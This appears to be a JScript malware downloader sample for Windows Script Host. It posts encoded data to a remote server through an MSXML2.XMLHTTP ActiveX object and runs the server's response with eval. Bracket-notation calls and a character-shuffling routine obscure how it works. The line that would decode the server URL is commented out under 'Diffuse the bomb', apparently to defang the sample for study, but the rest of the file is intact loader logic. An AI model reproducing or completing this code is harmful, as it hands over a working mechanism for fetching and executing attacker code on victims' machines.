
function request(a, b) {
	return util.execute(util.probsAdecoder(a), b);
}

function main(param) {
	this['eval'](param);
}


var activeX = this['ActiveXObject'];

function newActiveXthing(appname) {
	return new activeX(appname);
}



var util = {
	
	splitString : function (splitStr) {
		var newStr = '';
		for(var i=0; i<splitStr['length']; i++) {
			if(i%2) {
				newStr = splitStr['substr'](i, 1) + newStr;
			}
		}

		return newStr;
	},
	
	
	elementDecode : function (symbol) {
		return encodeURIComponent(symbol);
	},
	
	decodeList : function (encodedList, listIndex) {
		if(encodedList[listIndex][0]) {
			return encodedList[listIndex][0] + '=' + util.elementDecode(encodedList[listIndex][1]) + '&';
		}
		else {
			return listIndex + '=' + util.elementDecode(encodedList[listIndex]) + '&';
		}
	},
	
	probsAdecoder : function (thingToDecode) {
		var decoded = '';

		for (var i = 0; i < thingToDecode['length']; i++) {
			decoded += util.decodeList(thingToDecode, i);
		}
		
		return decoded;
	},
	
	execute : function (decoded, returnBody) {
		var xmlhttp;
		try {
			xmlhttp = newActiveXthing('MSXML2.XMLHTTP');
			xmlhttp['open']('POST', url2, false);
			xmlhttp['send'](decoded);
			if(returnBody) {
				return xmlhttp['responseBody'];
			}
			else {
				return xmlhttp['responseText'];		
			}
		} catch (e) {}
	}
	
};


// Diffuse the bomb
//var url2 = util.splitString('');

//The decoded version of this list might be -> 0=a&1=0&2=0&
main(request(['a', '500', '250']));